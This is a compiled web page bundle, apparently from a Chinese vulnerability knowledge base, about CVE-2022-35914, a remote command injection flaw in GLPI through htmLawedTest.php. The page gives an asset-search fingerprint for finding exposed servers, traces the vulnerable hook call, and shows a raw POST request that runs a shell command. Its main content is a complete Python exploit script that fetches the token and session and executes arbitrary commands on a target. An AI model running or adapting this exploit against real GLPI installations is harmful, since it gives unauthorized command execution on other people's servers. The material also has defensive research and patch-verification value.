import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as e,c as o,a as n,b as c,d as i,e as s}from"./app-58e4a7d6.js";const l={},u=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>GLPI是个人开发者的一款开源IT和资产管理软件。该软件提供功能全面的IT资源管理接口，你可以用它来建立数据库全面管理IT的电脑，显示器，服务器，打印机，网络设备，电话，甚至硒鼓和墨盒等。GLPI 10.0.2及之前版本存在安全漏洞，该漏洞源于htmlawed 模块中的 <code>/vendor/htmlawed/htmlawed/htmLawedTest.php</code> 允许 PHP 代码注入。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GLPI 10.0.2及之前版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;GLPI&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171712679.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现问题的文件为 <strong>htmLawedTest.php，</strong> 来源于第三方库 PHP Labware</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171712160.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在 htmLawedTest.php 中接收参数并传入方法 htmLawed 中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171712972.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>跟进文件 htmLawed.php 中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171712583.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if($C[&#39;hook&#39;]){$t = $C[&#39;hook&#39;]($t, $C, $S);}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这里可以看到参数均为用户可控参数，当控制参数 hhook 为 exec 和 text 为执行的命令时就导致了命令执行漏洞</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171713976.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/vendor/htmlawed/htmlawed/htmLawedTest.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171713502.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171713454.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问页面获取到 sid 与 token 后再发送请求包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 88
Content-Type: application/x-www-form-urlencoded

token=a79cf121bde57fe0e3cc0f247f77961a&amp;text=id&amp;hhook=exec&amp;sid=h1c0vk004dvulal5nj8i6en44e
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171714358.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,27),r={href:"https://github.com/cosad3s/CVE-2022-35914-poc",target:"_blank",rel:"noopener noreferrer"},d=s(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> argparse
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re

requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span> 

RED <span class="token operator">=</span> <span class="token string">&#39;\\x1b[91m&#39;</span>
BLUE <span class="token operator">=</span> <span class="token string">&#39;\\033[94m&#39;</span>
GREEN <span class="token operator">=</span> <span class="token string">&#39;\\033[32m&#39;</span>
ENDC <span class="token operator">=</span> <span class="token string">&#39;\\033[0m&#39;</span>

banner<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;  
  ______     _______     ____   ___ ____  ____      _________  ___  _ _  _   
 / ___\\ \\   / / ____|   |___ \\ / _ \\___ \\|___ \\    |___ / ___|/ _ \\/ | || |  
| |    \\ \\ / /|  _| _____ __) | | | |__) | __) |____ |_ \\___ \\ (_) | | || |_ 
| |___  \\ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \\__, | |__   _|
 \\____|  \\_/  |_____|   |_____|\\___/_____|_____|   |____/____/  /_/|_|  |_|  
&quot;&quot;&quot;</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;CVE-2022-35914 - GLPI - Command injection using a third-party library script&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">&quot;URL to test&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">,</span> default <span class="token operator">=</span> <span class="token string">&quot;id&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">&quot;Command to launch (default: id)&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-f&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;hook&#39;</span><span class="token punctuation">,</span> default <span class="token operator">=</span> <span class="token string">&quot;exec&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">&quot;PHP hook function (default: exec)&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--check&#39;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store_true&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;check&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">&quot;Just check, no command execution.&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--user-agent&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36&quot;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;user_agent&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">&quot;Custom User-Agent&quot;</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exploit<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>cmd<span class="token punctuation">,</span> args<span class="token punctuation">.</span>user_agent<span class="token punctuation">,</span>args<span class="token punctuation">.</span>check<span class="token punctuation">,</span>args<span class="token punctuation">.</span>hook<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>cmd<span class="token punctuation">,</span>user_agent<span class="token punctuation">,</span>check<span class="token punctuation">,</span>hook<span class="token punctuation">)</span><span class="token punctuation">:</span>
    uri <span class="token operator">=</span> <span class="token string">&quot;/vendor/htmlawed/htmlawed/htmLawedTest.php&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> user_agent<span class="token punctuation">}</span>

    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    response_part1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span>uri<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>response_part1<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        fail<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response_part1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">&#39;html.parser&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>soup<span class="token punctuation">.</span>title<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;htmLawed&quot;</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        fail<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>GREEN <span class="token operator">+</span> <span class="token string">&quot;[+] Server potentially vulnerable to CVE-2022-35914&quot;</span> <span class="token operator">+</span> ENDC<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Prepare POST request</span>
    token_value <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">]</span>
    sid_value <span class="token operator">=</span> session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;sid&quot;</span><span class="token punctuation">)</span>
    body <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;token&quot;</span><span class="token punctuation">:</span>token_value<span class="token punctuation">,</span><span class="token string">&quot;text&quot;</span><span class="token punctuation">:</span>cmd<span class="token punctuation">,</span><span class="token string">&quot;hhook&quot;</span><span class="token punctuation">:</span>hook<span class="token punctuation">,</span><span class="token string">&quot;sid&quot;</span><span class="token punctuation">:</span>sid_value<span class="token punctuation">}</span>
    response_part2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span>uri<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>body<span class="token punctuation">)</span>
    parse<span class="token punctuation">(</span>response_part2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">,</span> <span class="token string">&#39;html.parser&#39;</span><span class="token punctuation">)</span>
    raw <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">&#39;settingF&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    return_code_search_regex <span class="token operator">=</span> <span class="token string">&quot;\\$spec\\: (.*)&quot;</span>
    found_return_code <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>return_code_search_regex<span class="token punctuation">,</span> raw<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    output_search_regex <span class="token operator">=</span> <span class="token string">&quot;\\[xml:lang\\] \\=\\&gt; 0\\n(.*)\\n\\)&quot;</span>
    found_output <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>output_search_regex<span class="token punctuation">,</span> raw<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>GREEN <span class="token operator">+</span> <span class="token string">&quot;[+] Command output (Return code: &quot;</span> <span class="token operator">+</span> found_return_code <span class="token operator">+</span> <span class="token string">&quot;):&quot;</span> <span class="token operator">+</span> ENDC<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>found_output <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        raw_output <span class="token operator">=</span> found_output<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        cleaning_regex <span class="token operator">=</span> <span class="token string">&quot;.*\\=\\&gt;&quot;</span>
        cleaned_output <span class="token operator">=</span> re<span class="token punctuation">.</span>sub <span class="token punctuation">(</span>cleaning_regex<span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> raw_output<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>cleaned_output<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">fail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>RED <span class="token operator">+</span> <span class="token string">&quot;[-] Server not vulnerable to CVE-2022-35914&quot;</span> <span class="token operator">+</span> ENDC<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function k(_,v){const a=p("ExternalLinkIcon");return e(),o("div",null,[u,n("ul",null,[n("li",null,[n("a",r,[c("https://github.com/cosad3s/CVE-2022-35914-poc"),i(a)])])]),d])}const g=t(l,[["render",k],["__file","GLPI htmLawedTest.php 远程命令执行漏洞 CVE-2022-35914.html.vue"]]);export{g as default};
